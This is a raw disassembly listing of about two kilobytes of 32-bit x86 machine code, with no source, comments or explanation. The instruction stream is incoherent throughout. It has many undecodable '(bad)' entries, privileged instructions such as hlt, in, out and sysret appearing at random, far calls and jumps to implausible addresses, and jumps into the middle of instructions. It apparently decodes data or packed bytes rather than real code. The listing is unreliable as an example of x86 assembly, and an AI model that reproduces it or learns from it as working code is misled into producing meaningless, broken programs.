  4327e6:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  4327ed:	retf   
  4327ee:	cmp    eax,ecx
  4327f0:	pushf  
  4327f1:	jge    0x4327ba
  4327f3:	ss cld 
  4327f5:	pushf  
  4327f6:	test   DWORD PTR [edi-0x8],ebx
  4327f9:	je     0x432840
  4327fb:	xor    esi,DWORD PTR ds:0x7020840
  432801:	ror    BYTE PTR [ebp-0x37],0x8d
  432805:	push   ebp
  432806:	add    esp,ebp
  432808:	jb     0x432795
  43280a:	add    BYTE PTR [eax],cl
  43280c:	dec    ebp
  43280d:	mov    bh,0x81
  43280f:	push   esi
  432810:	push   ebx
  432811:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432818:	xor    al,BYTE PTR [eax]
  43281a:	mov    edx,DWORD PTR [edi+0x10]
  43281d:	(bad)  
  43281e:	scas   eax,DWORD PTR es:[edi]
  43281f:	cmp    bh,BYTE PTR [ebx]
  432821:	add    BYTE PTR [edi],cl
  432823:	mov    ebp,ebp
  432825:	cld    
  432826:	add    BYTE PTR [ebx],bh
  432828:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43282c:	dec    ebp
  43282d:	or     BYTE PTR [ebx],ch
  43282f:	ret    0x458b
  432832:	lock jmp 0x432826
  432835:	mov    ecx,DWORD PTR [eax]
  432837:	or     BYTE PTR [edi],al
  432839:	mov    ecx,eax
  43283b:	xor    DWORD PTR [edx+0x2],0x0
  43283f:	mov    bh,0xc1
  432841:	adc    BYTE PTR [eax],dh
  432843:	iret   
  432844:	inc    ebp
  432845:	mov    DWORD PTR [ebx],0x4dfff8c5
  43284b:	inc    BYTE PTR [ebx]
  43284d:	cmp    bh,al
  43284f:	add    BYTE PTR [ecx],dl
  432851:	data16 adc al,bh
  432854:	dec    ecx
  432855:	fisttp WORD PTR [ecx+0x456604c0]
  43285b:	add    dh,BYTE PTR ds:0x75e0845
  432861:	ret    0x4d
  432864:	lea    ecx,[ebx+0x18728301]
  43286a:	add    BYTE PTR [ebp+0x45],al
  43286d:	xor    eax,0xc7009ce9
  432872:	add    al,ch
  432874:	inc    ebp
  432875:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43287b:	xor    eax,0x781084d
  432880:	push   ebx
  432881:	call   0xf89a:0x89813251
  432888:	xor    al,BYTE PTR [ebp+0x3b]
  43288b:	cmp    eax,0xc78b9c76
  432890:	or     ah,dh
  432892:	inc    ebp
  432893:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432899:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43289f:	in     al,dx
  4328a0:	hlt    
  4328a1:	push   ebx
  4328a2:	push   ebx
  4328a3:	push   ecx
  4328a4:	push   ecx
  4328a5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4328ab:	call   0xe889:0x8b32329a
  4328b2:	clc    
  4328b3:	icebp  
  4328b4:	pop    ebx
  4328b5:	or     BYTE PTR [ebp+0x7],al
  4328b8:	mov    eax,ecx
  4328ba:	clc    
  4328bb:	jb     0x43287e
  4328bd:	add    BYTE PTR [ebp+0x55],cl
  4328c0:	or     DWORD PTR [edi],0xc251d153
  4328c6:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  4328d0:	mov    edi,eax
  4328d2:	or     cl,al
  4328d4:	inc    ebp
  4328d5:	dec    ebp
  4328d6:	mov    eax,DWORD PTR [ecx+0x514d530c]
  4328dc:	or     WORD PTR [ecx],0x899a
  4328e1:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  4328e7:	mov    edx,DWORD PTR [ecx+0x8]
  4328ea:	mov    eax,DWORD PTR [ebp-0x8]
  4328ed:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  4328f4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328fa:	inc    ebp
  4328fb:	dec    eax
  4328fc:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432902:	add    edx,DWORD PTR [ecx-0x8]
  432905:	mov    ecx,DWORD PTR [ecx]
  432907:	clc    
  432908:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43290f:	mov    ecx,ebp
  432911:	clc    
  432912:	(bad)  
  432913:	popf   
  432914:	inc    DWORD PTR [eax]
  432916:	ret    0x8b
  432919:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43291f:	mov    edi,esp
  432921:	hlt    
  432922:	test   ecx,esi
  432924:	clc    
  432925:	or     BYTE PTR [ebp+0x7],al
  432928:	xor    al,0xc1
  43292a:	pushf  
  43292b:	jb     0x432960
  43292d:	add    BYTE PTR [eax-0x3f],al
  432930:	inc    eax
  432931:	daa    
  432932:	inc    ebp
  432933:	inc    ebp
  432934:	xor    eax,0x7f80803
  432939:	dec    ebp
  43293a:	call   0xc09:0x39f83203
  432941:	or     BYTE PTR [edx],al
  432943:	inc    ebp
  432944:	sub    al,0x35
  432946:	inc    ebp
  432947:	or     BYTE PTR ds:0x74d0807,dh
  43294d:	lea    ebx,[edx-0x748dcdff]
  432953:	add    BYTE PTR [eax*2-0x74b21438],cl
  43295a:	mov    edx,DWORD PTR [eax]
  43295c:	cld    
  43295d:	dec    ebp
  43295e:	push   ebx
  43295f:	sub    edx,DWORD PTR [ecx-0x75]
  432962:	add    eax,0xf172fc
  432967:	or     BYTE PTR [ebp+0x7],cl
  43296a:	add    eax,ecx
  43296c:	or     al,0x72
  43296e:	add    DWORD PTR [eax],eax
  432970:	mov    ebx,0x29c2c1
  432975:	inc    ebp
  432976:	mov    eax,DWORD PTR [ebx]
  432978:	cmp    eax,0x3004d1c
  43297e:	xbegin 0x66c8b578
  432984:	clc    
  432985:	or     BYTE PTR [ebp+0x45],al
  432988:	xor    al,0x35
  43298a:	pushf  
  43298b:	or     BYTE PTR [ebx+0x454d1007],cl
  432991:	lea    eax,[ebp+0x33727501]
  432997:	add    cl,ch
  432999:	inc    ebp
  43299a:	add    bl,ch
  43299c:	add    BYTE PTR [ebx+0x45850845],cl
  4329a2:	je     0x43292f
  4329a4:	push   ebx
  4329a5:	or     al,0x85
  4329a7:	dec    ebp
  4329a8:	std    
  4329a9:	mov    bh,bh
  4329ab:	mov    BYTE PTR [ebp-0x75],al
  4329ae:	mov    edi,eax
  4329b0:	or     al,0x89
  4329b2:	inc    ebp
  4329b3:	clc    
  4329b4:	mov    esp,esp
  4329b6:	hlt    
  4329b7:	call   DWORD PTR [edi-0x37]
  4329ba:	push   ebx
  4329bb:	or     al,0x51
  4329bd:	push   ebp
  4329be:	xor    ebp,esp
  4329c0:	mov    esi,0x457251
  4329c5:	xor    eax,0xc7459cc6
  4329ca:	mov    edi,eax
  4329cc:	or     al,0x85
  4329ce:	add    al,bh
  4329d0:	inc    eax
  4329d2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4329d6:	or     ah,bh
  4329d8:	inc    eax
  4329d9:	push   ebx
  4329da:	jmp    0x432a2d
  4329dc:	mov    eax,DWORD PTR ds:0xe8720c
  4329e2:	mov    DWORD PTR [ebp-0x8],eax
  4329e5:	jne    0x432a2c
  4329e7:	jmp    0x432974
  4329e9:	mov    ebp,DWORD PTR [eax]
  4329eb:	clc    
  4329ec:	retf   0xff53
  4329ef:	push   ecx
  4329f0:	mov    DWORD PTR ds:0x757210,eax
  4329f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4329f9:	sub    esp,DWORD PTR [ebx-0x77]
  4329fc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a03:	or     ah,bh
  432a05:	pop    es
  432a06:	ds call 0x8f0:0x8b8b32ff
  432a0e:	(bad)  
  432a0f:	dec    ebp
  432a10:	(bad)  
  432a11:	mov    bh,bh
  432a13:	jmp    0x432a01
  432a15:	leave  
  432a16:	jne    0x432a20
  432a18:	call   0x302372
  432a1d:	in     al,dx
  432a1e:	dec    ebp
  432a1f:	add    dh,BYTE PTR [ebx]
  432a21:	add    BYTE PTR [ebx],al
  432a23:	inc    ebp
  432a24:	cmp    esi,DWORD PTR ds:0xc78b9c74
  432a2a:	or     al,0xf0
  432a2c:	add    BYTE PTR [ebp+0x458bf845],al
  432a32:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a38:	adc    al,0x7
  432a3a:	enter  0x9fc0,0xa5
  432a3e:	rol    BYTE PTR [eax],0x5e
  432a41:	mov    ecx,ecx
  432a43:	or     al,0xc
  432a45:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a4c:	jmp    0x432a4d
  432a4e:	push   ebp
  432a4f:	mov    esp,ebp
  432a51:	cld    
  432a52:	inc    ebp
  432a53:	inc    ebp
  432a54:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a5b:	push   esi
  432a5c:	push   esi
  432a5d:	mov    edi,0x7af080f
  432a62:	add    bh,al
  432a64:	test   DWORD PTR [edx+0x3a7320f],ebx
  432a6a:	add    BYTE PTR [ecx+0x4540100f],cl
  432a70:	mov    ebp,eax
  432a72:	mov    ebp,edi
  432a74:	lock call edx
  432a77:	fcom   DWORD PTR [ebp+0x45]
  432a7a:	mov    eax,0x148a8b
  432a7f:	push   ecx
  432a80:	enter  0xc145,0x83
  432a84:	cmp    ecx,DWORD PTR [eax]
  432a86:	add    BYTE PTR [ebp+0x4d],al
  432a89:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a8f:	call   0xffa325fe
  432a94:	cmp    eax,DWORD PTR [ebp-0xc]
  432a97:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a9b:	push   ebp
  432a9c:	(bad)
  432a9f:	std    
  432aa0:	lock push DWORD PTR [edi+0x5d08fcdb]
  432aa7:	inc    ebp
  432aa8:	(bad)  
  432aa9:	call   0xff7d2739
  432aae:	add    al,BYTE PTR [ebp+0x37]
  432ab1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  432ab7:	jne    0x432ab9
  432ab9:	(bad)  
  432aba:	cmp    edi,esp
  432abc:	jne    0x432aef
  432abe:	mov    edi,edi
  432ac0:	or     BYTE PTR [ebx-0x307f0b49],cl
  432ac6:	pop    ds
  432ac7:	into   
  432ac8:	je     0x432a8b
  432aca:	mov    ebx,DWORD PTR [esi]
  432acc:	or     BYTE PTR [ebp-0x49],al
  432acf:	mov    esp,DWORD PTR [esi-0x77]
  432ad2:	mov    esi,0x451f0c
  432ad7:	mov    eax,DWORD PTR [eax]
  432ad9:	or     al,0x66
  432adb:	sar    bl,0x3b
  432ade:	xor    esi,DWORD PTR [ebp+0x66]
  432ae1:	xor    ecx,edi
  432ae3:	pop    edi
  432ae4:	adc    bl,BYTE PTR [ebx+0x7c]
  432ae7:	ret    0xff
  432aea:	cld    
  432aeb:	inc    ebp
  432aec:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432af2:	cld    
  432af3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432afa:	push   0xffffff83
  432afc:	pop    edi
  432afd:	or     BYTE PTR [ebp+0x53],dh
  432b00:	xorps  xmm1,xmm2
  432b03:	test   BYTE PTR [eax+eax*1],bh
  432b06:	add    BYTE PTR [eax],al
  432b08:	adc    eax,eax
  432b0a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432b12:	jmp    DWORD PTR [eax]
  432b14:	ror    al,0x5e
  432b17:	inc    ebp
  432b18:	leave  
  432b19:	xor    ecx,DWORD PTR [eax]
  432b1b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432b21:	add    ch,al
  432b23:	xor    edi,edi
  432b25:	xor    DWORD PTR [ebx],0x66003300
  432b2b:	mov    DWORD PTR [ebp-0xc],ecx
  432b2e:	pcmpgtw mm0,mm0
  432b31:	add    dl,ah
  432b33:	leave  
  432b34:	mov    edi,DWORD PTR [esi-0x7d]
  432b37:	push   ax
  432b39:	dec    ebp
  432b3a:	mov    esi,DWORD PTR [ebx-0x75]
  432b3d:	lea    ebp,[eax-0x7c010000]
  432b43:	xor    eax,DWORD PTR [eax]
  432b45:	sysret 
  432b47:	dec    ebp
  432b48:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b4f:	push   WORD PTR [ecx+0x8]
  432b53:	jne    0x432b16
  432b55:	ud0    ecx,DWORD PTR [ecx]
  432b58:	mov    edi,DWORD PTR [edx]
  432b5a:	lods   al,BYTE PTR ds:[esi]
  432b5b:	add    BYTE PTR [eax],al
  432b5d:	data16 (bad) 
  432b5f:	iret   
  432b60:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b67:	cli    
  432b68:	inc    ebp
  432b69:	cmp    al,0x8d
  432b6b:	add    BYTE PTR [esi+0x2d],ah
  432b6e:	inc    ebp
  432b6f:	pop    ebp
  432b70:	lea    ecx,[edi]
  432b72:	mov    dl,bh
  432b74:	add    BYTE PTR [edi],cl
  432b76:	mov    DWORD PTR [eax+eax*8],edi
  432b79:	mov    ebx,0x3b87
  432b7e:	add    BYTE PTR [ebx],ch
  432b80:	inc    ebp
  432b81:	data16 (bad) 
  432b83:	clc    
  432b84:	int3   
  432b85:	cmp    eax,DWORD PTR [eax]
  432b87:	je     0x432b12
  432b89:	push   0xffffffc8
  432b8b:	pop    edi
  432b8c:	xchg   DWORD PTR [ebp+0x0],eax
  432b8f:	data16 add BYTE PTR [ebp+0x45],cl
  432b93:	lea    cx,[ebp+0x10]
  432b97:	jb     0x432b99
  432b99:	jmp    0x432b24
  432b9b:	call   eax
  432b9d:	clc    
  432b9e:	xchg   DWORD PTR [edi+0x1],edi
  432ba1:	mov    eax,DWORD PTR [eax]
  432ba3:	or     BYTE PTR [ebp-0x49],al
  432ba6:	lea    eax,[eax+0x74003154]
  432bac:	push   edi
  432bad:	inc    edx
  432bae:	jge    0x432baf
  432bb0:	mov    DWORD PTR [edi],ecx
  432bb2:	fdiv   DWORD PTR [edi-0x6]
  432bb5:	inc    DWORD PTR [eax]
  432bb7:	xor    edx,DWORD PTR [eax+0x5f]
  432bba:	xchg   DWORD PTR [ebx+0x1],ebx
  432bbd:	ret    0x0
  432bc0:	xor    BYTE PTR [ebp-0x51],cl
  432bc3:	cmp    edi,0xf0ff8900
  432bc9:	data16 ror al,0x84
  432bcd:	rol    BYTE PTR [eax],0x3b
  432bd0:	add    al,dh
  432bd2:	dec    eax
  432bd3:	xchg   esp,eax
  432bd4:	push   ebx
  432bd5:	jmp    0x432b62
  432bd7:	push   ebp
  432bd8:	add    esp,ebp
  432bda:	add    ebp,esp
  432bdc:	mov    edx,DWORD PTR [edi+0x24]
  432bdf:	clc    
  432be0:	dec    esi
  432be1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432be7:	cmp    BYTE PTR [ebx],al
  432be9:	jne    0x432b74
  432beb:	xor    esp,eax
  432bed:	jmp    0x462d70
  432bf2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bf5:	jne    0x432beb
  432bf7:	call   0xffcd2951
  432bfc:	clc    
  432bfd:	xchg   edi,eax
  432bfe:	sti    
  432bff:	add    DWORD PTR [ebx],eax
  432c01:	add    BYTE PTR [ebp+0x47],bl
  432c04:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c0a:	pop    ebp
  432c0b:	mov    DWORD PTR [esi-0x48],esi
  432c0e:	jmp    0x432c57
  432c10:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c16:	(bad)  
  432c18:	cmp    al,0x0
  432c1a:	cmp    eax,DWORD PTR [ebp+0x18]
  432c1d:	lea    ebx,[ebp-0x56]
  432c20:	jle    0x432c22
  432c22:	jae    0x432bad
  432c24:	mov    eax,esp
  432c26:	call   0xb900:0x8b005587
  432c2d:	inc    ebp
  432c2e:	push   ebp
  432c2f:	lea    ecx,[ebp-0x27ff4f12]
  432c35:	mov    eax,edi
  432c37:	int3   
  432c38:	push   ebp
  432c39:	xchg   edi,eax
  432c3b:	add    esp,ebp
  432c3d:	add    BYTE PTR [eax],al
  432c3f:	inc    ebp
  432c40:	add    BYTE PTR [ebp+0x8b3255],cl
  432c46:	cld    
  432c47:	mov    DWORD PTR [edx],edi
  432c49:	aam    0x75
  432c4b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c51:	mov    DWORD PTR [ebx-0x50],edx
  432c54:	test   BYTE PTR [ebp-0x1],0xe8
  432c58:	mov    eax,DWORD PTR [eax]
  432c5a:	hlt    
  432c5b:	add    al,al
  432c5d:	mov    eax,DWORD PTR ds:0x890045a8
  432c63:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c69:	inc    DWORD PTR [eax*2+0xf75854d]
  432c70:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c76:	call   0x729989b7
  432c7b:	je     0x432cdb
  432c7d:	js     0x432cde
  432c7f:	lock ret 0x7e
  432c83:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c89:	mov    edi,edi
  432c8b:	sbb    al,bl
  432c8d:	clc    
  432c8e:	add    BYTE PTR [ebp-0x73],bh
  432c91:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c97:	ror    BYTE PTR [eax],1
  432c99:	dec    ebp
  432c9a:	xchg   ebp,eax
  432c9b:	mov    edi,edi
  432c9d:	in     al,0x8b
  432c9f:	jge    0x432c2a
  432ca1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ca7:	clc    
  432ca8:	pop    esi
  432ca9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432caf:	clc    
  432cb0:	add    al,0x6e
  432cb2:	mov    eax,DWORD PTR [ebx]
  432cb4:	mov    BYTE PTR [ebp+0x0],dl
  432cb7:	mov    edx,DWORD PTR [ebx-0x20]
  432cba:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432cc0:	add    eax,0x3b3b73
  432cc5:	adc    al,0x89
  432cc7:	pop    eax
  432cc8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432ccc:	ret    0xf08
  432ccf:	cmp    al,0x2
  432cd1:	mov    DWORD PTR [edx],edi
  432cd3:	cld    
  432cd4:	add    BYTE PTR [ebp+0x66],dl
  432cd7:	add    eax,ebx
  432cd9:	add    esp,eax
  432cdb:	sub    eax,eax
  432cdd:	or     BYTE PTR [ecx-0x77f474bb],cl
  432ce3:	add    BYTE PTR [eax],al
  432ce5:	mov    DWORD PTR [ebx-0x24],ebx
  432ce8:	push   edi
  432ce9:	push   ebp
  432cea:	clc    
  432ceb:	add    DWORD PTR [esi+0x1b0100],0x45
  432cf2:	out    0xff,eax
  432cf4:	add    edx,DWORD PTR [eax]
  432cf6:	jmp    0x432ce0
  432cf8:	cmp    ch,0x45
  432cfb:	(bad)  
  432cfc:	jmp    0x40c8b54e
  432d01:	je     0x432c8d
  432d03:	mov    eax,DWORD PTR [eax-0x10c78304]
  432d09:	inc    ebp
  432d0a:	add    BYTE PTR [ebx-0x770375],al
  432d10:	add    ah,ch
  432d12:	add    edx,esp
  432d14:	pop    edi
  432d15:	pop    ebp
  432d16:	push   ebp
  432d17:	inc    ebx
  432d18:	in     al,dx
  432d19:	pop    ebp
  432d1a:	in     al,dx
  432d1b:	cmp    edx,DWORD PTR [edi-0x8]
  432d1e:	xor    eax,0x895b9c94
  432d23:	leave  
  432d24:	call   0x8998742d
  432d29:	in     al,dx
  432d2a:	in     al,0x45
  432d2c:	dec    ebp
  432d2d:	push   esi
  432d2e:	test   DWORD PTR [eax+0xfb010f],esi
  432d34:	add    BYTE PTR [eax+0xc018b],dh
  432d3a:	leave  
  432d3b:	inc    ebp
  432d3c:	test   al,ch
  432d3e:	add    dh,bh
  432d40:	add    bh,bh
  432d42:	dec    ebp
  432d43:	push   cs
  432d44:	mov    DWORD PTR [ecx],eax
  432d46:	hlt    
  432d47:	push   es
  432d48:	dec    ebp
  432d49:	leave  
  432d4a:	mov    DWORD PTR [eax],ecx
  432d4c:	clc    
  432d4d:	cmovge eax,ecx
  432d50:	mov    ecx,0x85c2f0
  432d56:	clc    
  432d57:	pop    DWORD PTR [ebp+0x1]
  432d5a:	push   ebx
  432d5b:	add    BYTE PTR [ebp-0x15],bh
  432d5e:	push   esi
  432d5f:	xor    eax,0x898a45
  432d64:	cld    
  432d65:	add    BYTE PTR [ebp+0x0],al
  432d68:	cmp    esp,DWORD PTR [esi-0x64]
  432d6b:	add    DWORD PTR [esi+0x78308c1],edi
  432d71:	add    ah,BYTE PTR [esi-0x49]
  432d74:	int    0xbb
  432d76:	mov    ecx,DWORD PTR [edi+0xc]
  432d79:	add    dh,al
  432d7b:	cmp    ecx,ebx
  432d7d:	jne    0x432d47
  432d7f:	xor    ecx,DWORD PTR [ebp+0x66]
  432d82:	jmp    0xca2d88
  432d87:	add    DWORD PTR [ebp+0x0],eax
  432d8a:	mov    eax,ebx
  432d8c:	or     al,0x8b
  432d8e:	(bad)  
  432d8f:	mov    ecx,esi
  432d91:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432d98:	mov    eax,edi
  432d9a:	or     BYTE PTR [edx],cl
  432d9c:	shl    cl,cl
  432d9e:	icebp  
  432d9f:	add    BYTE PTR [ebp+0x39],0x8b
  432da3:	or     BYTE PTR [edx+eax*2],cl
  432da6:	(bad)  
  432da7:	or     cl,dh
  432da9:	stc    
  432daa:	shl    DWORD PTR [ebp-0x30],0xc6
  432dae:	xor    al,0x0
  432db0:	inc    ebp
  432db1:	xchg   BYTE PTR [ebx],al
  432db3:	add    esp,edi
  432db5:	add    BYTE PTR [ebp-0x39],cl
  432db8:	mov    al,bl
  432dba:	test   DWORD PTR [ebx+0x1c348375],ecx
  432dc0:	sub    al,0xbf
  432dc2:	jmp    0x432d49
  432dc4:	mov    edi,eax
  432dc6:	lock jge 0x432dba
  432dc9:	lea    esi,[edx-0x74bad501]
  432dcf:	mov    ebp,esp
  432dd1:	or     cl,dh
  432dd3:	leave  
  432dd4:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432ddb:	dec    ebp
  432ddc:	dec    ebp
  432ddd:	test   DWORD PTR [ebx],eax
  432ddf:	paddb  mm6,mm0
  432de2:	add    DWORD PTR [eax],eax
  432de4:	dec    ebp
  432de5:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432deb:	mov    esi,DWORD PTR [edx]
  432ded:	or     al,0x2b
  432def:	dec    ebp
  432df0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432df6:	mov    esp,eax
  432df8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dff:	mov    DWORD PTR [ebx],ebp
  432e01:	call   0xc76b731
  432e06:	mov    DWORD PTR [ebp+0x10],ecx
  432e09:	(bad)  
  432e0a:	push   0x8b85ff10
  432e0f:	clc    
  432e10:	or     al,0x53
  432e12:	(bad)  
  432e13:	push   ecx
  432e14:	retf   
  432e15:	mov    ebx,0xff4d8dc8
  432e1a:	mov    DWORD PTR [ebp+0x8],eax
  432e1d:	xor    eax,DWORD PTR [ebp-0x75]
  432e20:	cmp    ebp,DWORD PTR [ebx]
  432e22:	lsl    ebx,WORD PTR [edi-0x8]
  432e26:	call   DWORD PTR [ebx-0x741bff75]
  432e2c:	(bad)  
  432e2d:	or     al,0x5b
  432e2f:	dec    ebp
  432e30:	or     BYTE PTR [ebx],dh
  432e32:	inc    ebp
  432e33:	xor    esi,DWORD PTR ds:0x708088d
  432e39:	in     eax,0x9a
  432e3b:	add    BYTE PTR [edx],dh
  432e3d:	inc    ebp
  432e3e:	pop    edi
  432e3f:	xor    eax,edx
  432e41:	test   DWORD PTR [eax],0x81108b8b
  432e47:	dec    ebp
  432e48:	sub    al,0x33
  432e4a:	add    BYTE PTR [ebx],dh
  432e4c:	push   esi
  432e4d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e53:	mov    edi,eax
  432e55:	or     BYTE PTR [ebp+0x45],al
  432e58:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e5e:	xor    eax,0xc7069cc9
  432e63:	inc    ebp
  432e64:	cld    
  432e65:	cmp    DWORD PTR [ebp+0x454df817],eax
  432e6b:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432e72:	in     al,0x4d
  432e74:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432e7a:	aad    0xe9
  432e7c:	xlat   BYTE PTR ds:[ebx]
  432e7d:	rol    bh,cl
  432e7f:	mov    edx,esp
  432e81:	or     BYTE PTR [ebp+0x4588f84d],al
  432e87:	mov    ecx,DWORD PTR [eax]
  432e89:	or     BYTE PTR [eax],al
  432e8b:	push   ebp
  432e8c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e92:	dec    ebp
  432e93:	enter  0xceba,0x8
  432e97:	retf   0x1807
  432e9a:	ret    0x9a4d
  432e9d:	mov    esi,DWORD PTR [edx]
  432e9f:	or     al,0x33
  432ea1:	into   
  432ea2:	add    edx,esi
  432ea4:	add    ecx,edx
  432ea6:	bswap  eax
  432ea8:	ror    esi,0x98
  432eab:	dec    ebp
  432eac:	add    cl,ch
  432eae:	mov    edi,edi
  432eb0:	hlt    
  432eb1:	inc    esi
  432eb3:	inc    ebp
  432eb4:	ret    0x4533
  432eb7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ebd:	or     BYTE PTR [ebx],dh
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432ec6:	jne    0xff8d2e8d
  432ecc:	inc    ebp
  432ecd:	inc    ebp
  432ece:	mov    esi,DWORD PTR [ebx]
  432ed0:	clc    
  432ed1:	pop    esi
  432ed2:	ret    0xcaeb
  432ed5:	mov    eax,esi
  432ed7:	call   0x520482aa
  432edc:	dec    ebp
  432edd:	add    eax,0xf8728b
  432ee2:	adc    eax,0xce0ccac9
  432ee7:	push   ebp
  432ee8:	ret    0xc6ec
  432eeb:	in     al,dx
  432eec:	call   0x33437bf5
  432ef1:	push   edi
  432ef2:	add    edi,eax
  432ef4:	xor    eax,eax
  432ef6:	jmp    0x432f3d
  432ef8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432efe:	add    eax,edi
  432f00:	shr    eax,cl
  432f02:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f08:	mov    esi,DWORD PTR [esp+ebp*8]
  432f0b:	pushf  
  432f0c:	ret    0x84c7
  432f0f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432f15:	inc    ebp
  432f16:	in     al,dx
  432f17:	xor    eax,0xc78b9c45
  432f1c:	cld    
  432f1d:	fmul   st(2),st
  432f1f:	sbb    dl,al
  432f21:	jmp    0x9c3b:0x364d45c1
  432f28:	jbe    0x432ef1
  432f2a:	mov    esp,eax
  432f2c:	clc    
  432f2d:	add    BYTE PTR [ebp+0x0],cl
  432f30:	mov    ecx,ecx
  432f32:	lea    eax,[ebp-0x5]
  432f35:	mov    edi,edi
  432f37:	call   0x51ce8281
  432f3c:	hlt    
  432f3d:	xor    eax,edx
  432f3f:	mov    esi,0x9a7284
  432f44:	xor    cl,dl
  432f46:	mov    esi,eax
  432f48:	hlt    
  432f49:	into   
  432f4a:	inc    ebp
  432f4b:	scas   eax,DWORD PTR es:[edi]
  432f4c:	mov    ebp,ecx
  432f4e:	cld    
  432f4f:	add    dl,cl
  432f51:	add    dl,al
  432f53:	inc    ebp
  432f54:	shr    DWORD PTR [ebx],0x4d
  432f57:	xor    edi,DWORD PTR [ebx]
  432f59:	mov    DWORD PTR [edi],ecx
  432f5b:	clc    
  432f5c:	dec    esi
  432f5d:	inc    ebp
  432f5e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f64:	ret    0xc6ca
  432f67:	mov    BYTE PTR [ebp-0x32],0x53
  432f6b:	scas   eax,DWORD PTR es:[edi]
  432f6c:	inc    ebp
  432f6d:	jmp    0x432fa5
  432f6f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f76:	pop    ebx
  432f77:	xor    ecx,DWORD PTR [ebp+0x3]
  432f7a:	mov    eax,DWORD PTR [ebx]
  432f7c:	clc    
  432f7d:	test   edx,ecx
  432f7f:	mov    ecx,esi
  432f81:	cld    
  432f82:	call   0x8ab774cc
  432f87:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f8d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f93:	fdiv   QWORD PTR [ebx]
  432f95:	retf   0xce89
  432f98:	in     al,0xc1
  432f9a:	inc    ebp
  432f9b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432fa1:	into   
  432fa2:	mov    dh,0xc1
  432fa5:	call   0x8c17752e
  432faa:	(bad)  
  432fab:	cld    
  432fac:	mov    ecx,DWORD PTR [ebp-0x14]
  432faf:	xor    eax,ecx
  432fb1:	lea    eax,[ebp+0x8]
  432fb4:	mov    esi,DWORD PTR [edx-0x4]
  432fb7:	add    dl,al
  432fb9:	inc    ebp
  432fba:	mov    esp,0x32d89a8b
  432fbf:	dec    ebp
  432fc0:	mov    esi,DWORD PTR [ebx]
  432fc2:	cld    
  432fc3:	xor    eax,edx
  432fc5:	sub    esp,DWORD PTR [esi-0x75]
  432fc8:	int    0xec
  432fca:	sub    ecx,eax
  432fcc:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432fd2:	mov    esi,esp
  432fd4:	call   0x34177d5d
  432fd9:	inc    DWORD PTR [ebx]
  432fdb:	mov    edi,DWORD PTR [ebx]
  432fdd:	cld    
  432fde:	jne    0x43302d
  432fe0:	mov    esi,DWORD PTR [ebx]
  432fe2:	aam    0x8d
  432fe4:	dec    ebp
  432fe5:	or     BYTE PTR [ebx],dh
  432fe7:	jb     0x432fec
  432fe9:	add    BYTE PTR [edi+0x45],bl
  432fec:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432ff3:	xor    ebp,esp
  432ff5:	xor    eax,edi
  432ff7:	sub    edi,esp
  432ff9:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
